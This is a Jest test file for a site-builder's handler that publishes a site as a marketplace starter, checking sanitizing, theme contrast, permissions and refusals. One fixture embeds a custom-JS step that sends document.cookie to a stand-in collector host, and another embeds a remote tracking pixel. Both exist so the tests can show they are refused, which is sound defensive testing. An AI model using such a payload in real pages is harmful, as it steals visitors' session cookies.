/**
 * @license
 * Copyright 2026 Aglyn LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 * @jest-environment node
 */

/**
 * Publishing a whole site as a site starter (AGL-4049).
 *
 * Over an in-memory Firestore holding a real site's shape: a compressed Home
 * page (the form the besigner saves), a plain About page, and the layout the
 * Home page sits in. The REAL publish gate, sanitizer, phishing screen, query
 * field refresh and starter validity check run; only identity, permissions and
 * the profile read are staged.
 */

import { compress } from '@aglyn/aglyn/app-utils/compress'
import {
  buildDefaultHomeScreen,
  buildDefaultSiteLayout,
  DEFAULT_SITE_THEME,
} from '@aglyn/aglyn/app-utils/default-site'
import { starterLinksBySlug } from '@aglyn/aglyn/app-utils/site-starter-links'
import { setRegisteringPluginId } from '@aglyn/aglyn/app-utils/registering-plugin'
import { resetPluginServicesForTests } from '@aglyn/aglyn/plugin-manager/plugin-services'
import { registerPluginThemePresets } from '@aglyn/aglyn/plugin-manager/plugin-theme-presets'
import { PUBLISHER_AGREEMENT_VERSION } from '../model/publisher-agreement'

type Data = Record<string, any>

const state = {
  docs: new Map<string, Data>(),
  writes: [] as Array<{ path: string; data: Data }>,
  publisher: null as Data | null,
  canPublish: true,
  staff: false,
}

jest.mock('@aglyn/aglyn/server', () => ({
  CANVAS_ROOT_ELEMENT_ID: '_@_',
  checkEntitlement: () => true,
  createResourceUid: () => 'listing-new',
  // The REAL decoder: the besigner's compressed form is half of what this
  // door has to read.
  decodeStoredNodes: (
    jest.requireActual('@aglyn/aglyn/app-utils/stored-nodes') as {
      decodeStoredNodes: (raw: unknown) => unknown
    }
  ).decodeStoredNodes,
}))

jest.mock('@aglyn/tenant-runtime/org-permissions', () => ({
  resolveOrgPermissions: async () => ({
    orgId: 'pub-org',
    permissions: { publishToMarketplace: state.canPublish },
  }),
}))

jest.mock('./publisher-profile', () => ({
  resolvePublisherProfile: async () => state.publisher,
}))

jest.mock('@aglyn/tenant-data-admin', () => {
  const snapshotOf = (path: string) => {
    const data = state.docs.get(path)
    return {
      id: path.split('/').pop(),
      exists: data !== undefined,
      data: () => data,
      get: (field: string) => data?.[field],
    }
  }
  const docRef = (path: string): any => ({
    id: path.split('/').pop(),
    path,
    get: async () => snapshotOf(path),
    set: async (data: Data, options?: { merge?: boolean }) => {
      state.writes.push({ path, data })
      state.docs.set(path, options?.merge ? { ...(state.docs.get(path) ?? {}), ...data } : data)
    },
    collection: (name: string) => collectionRef(`${path}/${name}`),
  })
  const query = (path: string, clauses: Array<[string, unknown]>): any => ({
    where: (field: string, _op: string, value: unknown) => query(path, [...clauses, [field, value]]),
    limit: () => query(path, clauses),
    get: async () => {
      const docs = [...state.docs.entries()]
        .filter(([key]) => key.startsWith(`${path}/`) && !key.slice(path.length + 1).includes('/'))
        .filter(([, data]) => clauses.every(([field, value]) => data[field] === value))
        .map(([key]) => ({ ...snapshotOf(key), ref: docRef(key) }))
      return { empty: !docs.length, docs }
    },
  })
  const collectionRef = (path: string): any => ({ ...query(path, []), doc: (id: string) => docRef(`${path}/${id}`) })
  return {
    getOrgForHost: async () => ({ orgId: 'pub-org', org: { name: 'Pub Studio', plan: 'pro' } }),
    firebaseAdmin: {
      app: () => ({
        auth: () => ({ verifyIdToken: async () => ({ uid: 'u1', staff: state.staff }) }),
        firestore: () => ({ collection: (name: string) => collectionRef(name) }),
      }),
      firestore: {
        FieldValue: { serverTimestamp: () => 'NOW', arrayUnion: (value: unknown) => [value] },
        Timestamp: { now: () => 'NOW' },
      },
    },
  }
})

import { publishStarterHandler } from './publish-starter'

/** What firebase-admin hands back for a bytes field: a pooled `Buffer`. */
const pooled = (value: unknown) => {
  const bytes = compress(value)
  // A slab wider than the pool for a page larger than it.
  const pool = Buffer.allocUnsafeSlow(Math.max(Buffer.poolSize, bytes.byteLength + 128))
  const packed = pool.subarray(64, 64 + bytes.byteLength)
  packed.set(bytes)
  return packed
}

const HOME_NODES = {
  '_@_': { componentId: 'div', nodes: ['title', 'toAbout'] },
  title: { componentId: 'muiTypography', parentId: '_@_', props: { children: 'Welcome' } },
  toAbout: {
    componentId: 'muiScreenLink',
    parentId: '_@_',
    props: { children: 'About us', screenId: 's_about' },
  },
}
const ABOUT_NODES = {
  '_@_': { componentId: 'div', nodes: ['about'] },
  about: { componentId: 'muiTypography', parentId: '_@_', props: { children: 'About' } },
}
const LAYOUT_NODES = {
  '_@_': { componentId: 'div', nodes: ['bar', 'slot'] },
  bar: { componentId: 'muiAppBar', parentId: '_@_', nodes: ['brand'] },
  brand: {
    componentId: 'muiScreenLink',
    parentId: 'bar',
    props: { children: '{{host.businessName}}', screenId: 's_home' },
  },
  slot: { componentId: 'layoutSlot', parentId: '_@_' },
}

function seedSite() {
  state.docs.set('hosts/h1', {
    memberRoles: { u1: 'admin' },
    screens: { s_home: '/', s_about: 'about' },
    theme: DEFAULT_SITE_THEME,
  })
  state.docs.set('hosts/h1/screens/s_home', {
    displayName: 'Home',
    versionId: 'v1',
    layoutId: 'l1',
    seo: { title: 'Home' },
  })
  state.docs.set('hosts/h1/screens/s_home/versions/v1', { nodes: pooled(HOME_NODES) })
  state.docs.set('hosts/h1/screens/s_about', { displayName: 'About', versionId: 'v1', layoutId: 'l1' })
  state.docs.set('hosts/h1/screens/s_about/versions/v1', { nodes: ABOUT_NODES })
  state.docs.set('hosts/h1/layouts/l1', { displayName: 'Header and footer', versionId: 'lv1' })
  state.docs.set('hosts/h1/layouts/l1/versions/lv1', { nodes: LAYOUT_NODES })
}

beforeEach(() => {
  resetPluginServicesForTests()
  setRegisteringPluginId(undefined)
  state.docs.clear()
  state.writes = []
  state.canPublish = true
  state.staff = false
  state.publisher = {
    orgId: 'pub-org',
    handle: 'pub',
    displayName: 'Pub Studio',
    agreement: { version: PUBLISHER_AGREEMENT_VERSION },
  }
  seedSite()
})

function makeRes() {
  const res: any = {
    statusCode: 0,
    body: undefined as any,
    status(code: number) {
      res.statusCode = code
      return res
    },
    json(payload: unknown) {
      res.body = payload
      return res
    },
  }
  return res
}

/** A brand that reads on both of the default base's pages. */
const BUILTIN = {
  kind: 'builtin',
  base: 'bootstrap',
  brand: { light: { primary: '#1b5e20' }, dark: { primary: '#81c784' } },
  fonts: null,
}

async function publish(body: Data = {}, headers: Data = { authorization: 'Bearer token' }) {
  const res = makeRes()
  await publishStarterHandler(
    {
      method: 'POST',
      headers,
      body: { hostId: 'h1', displayName: 'Corner bistro', theme: BUILTIN, ...body },
    } as any,
    res,
  )
  return res
}

const listing = () => state.docs.get('marketplaceListings/listing-new')
const version = (n = 1) => state.docs.get(`marketplaceListings/listing-new/versions/${n}`)

describe('a site publishes as a starter (AGL-4049)', () => {
  it('lists a submitted starter, with its facets and nothing the platform decides', async () => {
    const res = await publish({ description: 'A neighborhood place', category: 'Restaurant', facets: { kind: 'restaurant' } })
    expect(res.statusCode).toBe(200)
    expect(res.body).toEqual({ listingId: 'listing-new', version: 1 })
    expect(listing()).toMatchObject({
      artifactType: 'siteStarter',
      profileId: 'pub-org',
      sourceStarterHostId: 'h1',
      displayName: 'Corner bistro',
      description: 'A neighborhood place',
      category: 'Restaurant',
      priceUsd: 0,
      screenCount: 2,
      latestVersion: 1,
      deletedAt: null,
      reviewStatus: 'submitted',
      starterKind: 'restaurant',
      starterBase: 'bootstrap',
      starterFonts: null,
      starterPages: 2,
      starterMode: 'base',
    })
    // The template door's key, which would cross the two listings, and the
    // platform's ordering mark, are never written by a publish.
    expect(listing()).not.toHaveProperty('sourceHostId')
    expect(listing()).not.toHaveProperty('official')
    // A starter in review is shown to its own publisher only.
    expect(listing()?.['browseAudience']).toEqual(['pub-org', 'pub-org|pub-org'])
  })

  it('stores every page, decoded and sanitized, with links by slug', async () => {
    await publish()
    const starter = version()?.['starter']
    expect(starter.screens.map((screen: Data) => [screen.displayName, screen.slug])).toEqual([
      ['Home', '/'],
      ['About', 'about'],
    ])
    expect(starter.screens[0].seo).toEqual({ title: 'Home' })
    const link = starter.screens[0].nodes.toAbout
    expect(link.props).toEqual({ children: 'About us', screenSlug: 'about' })
    expect(starter.screens[0].nodes.title).toMatchObject({ $id: 'title', parentId: '_@_' })
  })

  it('stores the Home page’s layout with its slot, its brand link by slug', async () => {
    await publish()
    const { layout } = version()!['starter']
    expect(layout.displayName).toBe('Header and footer')
    expect(layout.nodes.brand.props).toEqual({ children: '{{host.businessName}}', screenSlug: '/' })
    expect(layout.nodes.slot.componentId).toBe('layoutSlot')
    expect(layout).not.toHaveProperty('props')
  })

  it('stores a built-in theme as the body named it', async () => {
    await publish({
      theme: { kind: 'builtin', base: 'bootstrap', brand: { light: { primary: '#1b5e20' }, dark: { primary: '#81c784' } }, fonts: 'oswald' },
    })
    expect(version()?.['starter'].theme).toEqual({
      kind: 'builtin',
      base: 'bootstrap',
      brand: { light: { primary: '#1b5e20' }, dark: { primary: '#81c784' } },
      fonts: 'oswald',
    })
    expect(listing()).toMatchObject({ starterBase: 'bootstrap', starterFonts: 'oswald' })
  })

  it('stores the site’s own theme as a full theme', async () => {
    await publish({ theme: { kind: 'full' }, facets: { base: 'minimal' } })
    const { theme } = version()!['starter']
    expect(theme.kind).toBe('full')
    expect(theme.theme.colorSchemes.light.primary).toEqual(DEFAULT_SITE_THEME.colorSchemes?.light?.primary)
    // Host-local, never part of the artifact.
    expect(theme.theme).not.toHaveProperty('darkScheme')
    expect(listing()).toMatchObject({ starterBase: 'minimal' })
  })

  it('takes an AI starter with the answers it asks', async () => {
    const answers = { kind: 'restaurant', brief: '' }
    await publish({ mode: 'ai', answers })
    expect(version()?.['starter']).toMatchObject({ mode: 'ai', answers, facets: { mode: 'ai' } })
    expect(listing()).toMatchObject({ starterMode: 'ai' })
  })

  it('writes the version before the listing that names it', async () => {
    await publish()
    const paths = state.writes.map((write) => write.path)
    expect(paths.indexOf('marketplaceListings/listing-new/versions/1')).toBeLessThan(
      paths.indexOf('marketplaceListings/listing-new'),
    )
  })

  it('bumps the version on a re-publish and keeps the review verdict', async () => {
    await publish()
    state.docs.set('marketplaceListings/listing-new', { ...listing(), reviewStatus: 'listed' })
    const res = await publish()
    expect(res.body).toEqual({ listingId: 'listing-new', version: 2 })
    expect(version(2)).toBeDefined()
    expect(listing()).toMatchObject({ latestVersion: 2, reviewStatus: 'listed' })
  })

  it('never takes another listing of the same site for its own', async () => {
    // A template published from the same site, keyed on `sourceHostId`.
    state.docs.set('marketplaceListings/template-1', {
      artifactType: 'template',
      profileId: 'pub-org',
      sourceHostId: 'h1',
      latestVersion: 4,
    })
    expect((await publish()).body).toEqual({ listingId: 'listing-new', version: 1 })
    expect(state.docs.get('marketplaceListings/template-1')).toEqual({
      artifactType: 'template',
      profileId: 'pub-org',
      sourceHostId: 'h1',
      latestVersion: 4,
    })
  })
})

describe('a site born from the default site publishes whole (AGL-4049)', () => {
  /**
   * What "Create site" makes today, exactly: the default Home page (cards,
   * grids, an accordion, icons, a contact form, styles and a scroll-to
   * interaction) inside the default header and footer. A starter door that
   * refused it, or kept it without its styles, could not list most of what a
   * publisher would build.
   */
  function seedDefaultSite() {
    const home = buildDefaultHomeScreen('Corner bistro')
    const layout = buildDefaultSiteLayout('s_home')
    state.docs.set('hosts/h1', {
      memberRoles: { u1: 'admin' },
      screens: { s_home: '/' },
      theme: DEFAULT_SITE_THEME,
    })
    state.docs.set('hosts/h1/screens/s_home', {
      displayName: home.displayName,
      versionId: 'v1',
      layoutId: 'l1',
    })
    state.docs.set('hosts/h1/screens/s_home/versions/v1', { nodes: pooled(home.nodes) })
    state.docs.set('hosts/h1/layouts/l1', { displayName: layout.displayName, versionId: 'lv1' })
    state.docs.set('hosts/h1/layouts/l1/versions/lv1', { nodes: pooled(layout.nodes) })
    return { home, layout }
  }

  /** The nodes as stored: every one kept, links by slug, the root parentless. */
  const asStored = (nodes: Record<string, any>) =>
    Object.fromEntries(
      Object.entries(starterLinksBySlug(nodes, { s_home: '/' })).map(([id, node]) => [
        id,
        { ...node, parentId: node.parentId ?? null },
      ]),
    )

  beforeEach(() => {
    state.docs.clear()
  })

  it('publishes with every node, style and interaction kept', async () => {
    const { home, layout } = seedDefaultSite()
    const res = await publish()
    expect(res.statusCode).toBe(200)
    const starter = version()!['starter']
    expect(starter.screens).toHaveLength(1)
    expect(starter.screens[0].nodes).toEqual(asStored(home.nodes))
    expect(starter.layout.nodes).toEqual(asStored(layout.nodes))
    // The shapes that make it look like the site it came from.
    const styled = Object.values(starter.screens[0].nodes).filter((node: any) => node.sx)
    expect(styled.length).toBeGreaterThan(0)
    expect(Object.values(starter.layout.nodes).some((node: any) => node.interactions?.length)).toBe(true)
  })

  it('refuses a script, markup or redirect riding an interaction', async () => {
    seedDefaultSite()
    const layout = buildDefaultSiteLayout('s_home')
    const nodes = {
      ...layout.nodes,
      dl_contact: {
        ...layout.nodes['dl_contact'],
        interactions: [
          {
            id: 'x',
            name: 'Track',
            enabled: true,
            trigger: { event: 'elementClick', everyTime: true },
            steps: [{ type: 'runJs', code: 'fetch("https://collector.example/" + document.cookie)' }],
          },
        ],
      },
    }
    state.docs.set('hosts/h1/layouts/l1/versions/lv1', { nodes })
    const res = await publish()
    expect(res.statusCode).toBe(422)
    expect(res.body.error).toMatch(/^The site's layout: An interaction on the muiButton "dl_contact" runs "Run custom JS/)
    expect(state.writes).toEqual([])
  })

  it('refuses a style that loads from somewhere else', async () => {
    const { home } = seedDefaultSite()
    const [id, node] = Object.entries(home.nodes).find(([, entry]: [string, any]) => entry.sx) as [string, any]
    state.docs.set('hosts/h1/screens/s_home/versions/v1', {
      nodes: {
        ...home.nodes,
        [id]: { ...node, sx: { ...node.sx, backgroundImage: 'url(//beacon.example/pixel.gif)' } },
      },
    })
    const res = await publish()
    expect(res.statusCode).toBe(422)
    expect(res.body.error).toMatch(/beacon\.example/)
    expect(state.writes).toEqual([])
  })
})

describe('a built-in starter theme is checked as the site will wear it (AGL-4049)', () => {
  /**
   * The theme a starter on a built-in base creates is that base with the
   * brand and fonts over it (`siteStarterTheme`), so that composed theme is
   * what the publish checks: a brand nobody can read on the page is refused
   * here, where the publisher can pick another color, not discovered on
   * every site created from it.
   */
  const brand = (light: Record<string, string>, dark?: Record<string, string>) => ({
    theme: { kind: 'builtin', base: 'starter', brand: { light, ...(dark && { dark }) }, fonts: null },
  })

  it('refuses a primary that cannot be read on the page, naming the scheme and the fix', async () => {
    const res = await publish(brand({ primary: '#ffff66' }))
    expect(res.statusCode).toBe(422)
    expect(res.body.error).toMatch(
      /^The light primary color #ffff66 is 1\.\d:1 against the light page background, below 3:1, .* Choose a darker primary\.$/,
    )
    expect(res.body.errors).toEqual([
      expect.objectContaining({ path: 'colorSchemes.light.primary.main' }),
    ])
    expect(state.writes).toEqual([])
  })

  it('refuses a dark scheme that inherits an unreadable light brand, and takes its own', async () => {
    const navy = await publish(brand({ primary: '#1a237e' }))
    expect(navy.statusCode).toBe(422)
    expect(navy.body.error).toMatch(/^The dark primary color #1a237e .* or give the dark scheme its own brand colors/)
    expect(state.writes).toEqual([])
    const res = await publish(brand({ primary: '#1a237e' }, { primary: '#9fa8da' }))
    expect(res.statusCode).toBe(200)
    expect(version()?.['starter'].theme).toEqual({
      kind: 'builtin',
      base: 'starter',
      brand: { light: { primary: '#1a237e' }, dark: { primary: '#9fa8da' } },
      fonts: null,
    })
  })

  it('composes over the registered built-in the base names, not the default', async () => {
    // A built-in whose light page is near black: a brand that reads on the
    // default's pale page does not read on this one.
    registerPluginThemePresets(
      [
        {
          id: 'theme-presets.bootstrap',
          name: 'Night',
          theme: {
            colorSchemes: {
              light: {
                primary: { main: '#90caf9' },
                background: { default: '#0b0b0b', paper: '#161616' },
                text: { primary: '#f5f5f5', secondary: '#bdbdbd' },
              },
              dark: {
                primary: { main: '#90caf9' },
                background: { default: '#0b0b0b', paper: '#161616' },
                text: { primary: '#f5f5f5', secondary: '#bdbdbd' },
              },
            },
          },
        } as any,
      ],
      { pluginId: 'themes' },
    )
    const res = await publish({ theme: { ...BUILTIN, brand: { light: { primary: '#1b5e20' } } } })
    expect(res.statusCode).toBe(422)
    expect(res.body.error).toMatch(/^The light primary color #1b5e20 .* Choose a lighter primary\.$/)
    // The same brand on the default base, which this deployment also has.
    expect((await publish({ theme: { ...BUILTIN, base: 'starter' } })).statusCode).toBe(200)
  })
})

describe('what a starter publish refuses (AGL-4049)', () => {
  const refused = async (body: Data, status: number, error: string | RegExp) => {
    const res = await publish(body)
    expect(res.statusCode).toBe(status)
    expect(res.body.error).toEqual(typeof error === 'string' ? error : expect.stringMatching(error))
    expect(state.writes).toEqual([])
  }

  it('refuses a price under the floor before anything else', async () => {
    await refused({ priceUsd: 1 }, 400, /at least/)
  })

  it('refuses a body with no theme shape, or no known mode', async () => {
    await refused({ theme: undefined }, 400, "Choose the starter's theme: a built-in theme, or this site's own")
    await refused({ theme: { kind: 'snapshot' } }, 400, /Choose the starter's theme/)
    await refused({ mode: 'magic' }, 400, 'A starter is a base starter or an AI starter')
    await refused({ mode: 'ai', answers: 'kitchen' }, 400, "An AI starter's answers must be a set of answers")
  })

  it('refuses an unauthenticated caller', async () => {
    const res = await publish({}, {})
    expect(res.statusCode).toBe(401)
  })

  it('refuses a role that may not publish, and a site role that is neither admin nor editor', async () => {
    state.canPublish = false
    await refused({}, 403, 'Your organization role does not allow publishing to the marketplace')
    state.canPublish = true
    state.docs.set('hosts/h1', { ...state.docs.get('hosts/h1'), memberRoles: { u1: 'viewer' } })
    await refused({}, 403, 'Not a site admin or editor')
  })

  it('refuses without a current publisher agreement, and a priced starter without payouts', async () => {
    state.publisher = { ...state.publisher, agreement: undefined }
    const res = await publish()
    expect(res.statusCode).toBe(412)
    expect(state.writes).toEqual([])
    state.publisher = { ...state.publisher, agreement: { version: PUBLISHER_AGREEMENT_VERSION } }
    await refused({ priceUsd: 29 }, 412, 'Set up payouts first — Marketplace → Payouts — to sell site starters.')
  })

  it('refuses a site with no published Home page, in the validity check’s words', async () => {
    state.docs.set('hosts/h1', { ...state.docs.get('hosts/h1'), screens: { s_about: 'about' } })
    await refused({}, 422, 'A starter needs a published Home page at /')
  })

  it('refuses a Home page with no layout, and a layout with no slot', async () => {
    state.docs.set('hosts/h1/screens/s_home', { ...state.docs.get('hosts/h1/screens/s_home'), layoutId: null })
    await refused({}, 422, 'A starter needs a shared layout')
    seedSite()
    state.docs.set('hosts/h1/layouts/l1/versions/lv1', {
      nodes: { '_@_': { componentId: 'div', nodes: ['bar'] }, bar: LAYOUT_NODES.bar, brand: LAYOUT_NODES.brand },
    })
    await refused({}, 422, /has no content slot/)
  })

  it('refuses a page the sanitizer will not publish, naming the page', async () => {
    state.docs.set('hosts/h1/screens/s_about/versions/v1', {
      nodes: {
        '_@_': { componentId: 'div', nodes: ['raw'] },
        raw: { componentId: 'html', parentId: '_@_', props: { html: '<b>x</b>' } },
      },
    })
    await refused({}, 422, /^Page "About": Component "html" cannot be published/)
  })

  it('refuses more pages than a starter may have', async () => {
    const screens: Record<string, string> = { s_home: '/' }
    for (let index = 0; index < 25; index += 1) {
      const id = `s_${index}`
      screens[id] = `page-${index}`
      state.docs.set(`hosts/h1/screens/${id}`, { displayName: `Page ${index}`, versionId: 'v1' })
      state.docs.set(`hosts/h1/screens/${id}/versions/v1`, { nodes: ABOUT_NODES })
    }
    state.docs.set('hosts/h1', { ...state.docs.get('hosts/h1'), screens })
    await refused({}, 422, 'A starter can have at most 25 pages')
  })

  it('refuses a built-in theme it cannot use, where the publisher can fix it', async () => {
    await refused({ theme: { kind: 'builtin', base: 'no-such-base', brand: { light: {} }, fonts: null } }, 422, 'Unknown base theme "no-such-base"')
    await refused({ theme: { ...BUILTIN, fonts: 'no-such-pairing' } }, 422, 'Unknown font pairing "no-such-pairing"')
    await refused({ theme: { ...BUILTIN, brand: { light: { primary: 'not a color' } } } }, 422, 'The light primary color "not a color" is not a color')
    await refused({ theme: { ...BUILTIN, brand: { light: { background: '#fff' } } } }, 422, /"background" is not one/)
    await refused({ theme: { kind: 'builtin', brand: { light: {} } } }, 422, 'Choose the built-in theme the starter uses')
  })

  it('refuses a full theme the theme check refuses, with every problem', async () => {
    state.docs.set('hosts/h1', { ...state.docs.get('hosts/h1'), theme: null })
    const res = await publish({ theme: { kind: 'full' } })
    expect(res.statusCode).toBe(422)
    expect(res.body.errors?.length).toBeGreaterThan(0)
    expect(state.writes).toEqual([])
  })

  it('refuses an AI starter without the questions it asks', async () => {
    await refused({ mode: 'ai' }, 422, 'An AI starter needs the questions it asks')
  })

  it('screens the listing before anything is listed', async () => {
    const res = await publish({ displayName: 'PayPal Support Center' })
    expect(res.statusCode).toBe(422)
    expect(res.body.code).toBe('impersonation')
    expect(state.writes).toEqual([])
  })
})
